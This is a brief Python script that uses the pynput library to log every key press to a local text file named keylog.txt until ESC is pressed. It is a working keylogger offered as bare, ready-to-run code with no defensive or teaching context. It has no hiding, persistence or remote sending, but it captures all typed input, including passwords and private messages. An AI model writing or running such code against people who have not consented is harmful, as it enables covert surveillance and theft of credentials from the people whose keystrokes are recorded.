from pynput.keyboard import Key, Listener

# Path to the file where you want to save the logged keys
log_file = "keylog.txt"

def on_press(key):
    try:
        # append input to log files
        with open(log_file, 'a') as f:
            f.write('{0} '.format(key))
    except Exception as e:
        print(str(e))

def on_release(key):
    if key == Key.esc:  # ESC to stop 
        return False

# Starting the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
